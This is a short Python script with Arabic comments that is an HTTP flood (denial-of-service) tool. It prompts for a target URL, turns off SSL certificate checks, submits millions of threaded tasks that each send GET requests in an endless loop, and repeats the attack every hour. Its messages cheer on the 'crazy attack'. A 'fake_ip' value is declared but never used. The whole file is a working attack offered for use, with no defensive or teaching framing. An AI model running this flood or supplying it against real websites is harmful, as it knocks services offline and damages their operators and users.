import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

def attack(url):
    while True:
        try:
            response = session.get(url, headers=headers)
            print("🚀🚀🚀 تم إطلاق صاروخ طلب إلى:", url)
        except Exception as e:
            print("💥💥💥 أوه لا! حدث خطأ مجنون:", e)

def start_attack(url):
    with ThreadPoolExecutor() as executor:
        for _ in range(5000000):
            executor.submit(attack, url)

    # الطلب الأولي خارج الهجمات
    try:
        response = session.get(url, headers=headers)
        print("🔥🔥🔥 النتيجة الأولية:", response.text)
    except Exception as e:
        print("💥💥💥 خطأ أولي مجنون:", e)

url = input("🎯 أدخل رابط الهدف المجنون: ")

print("💣💣💣 بدء الهجوم المجنون بشكل مستمر على مدار 24 ساعة 💣💣💣")

while True:
    start_attack(url)
    time.sleep(3600)  # انتظار ساعة قبل تكرار الهجوم
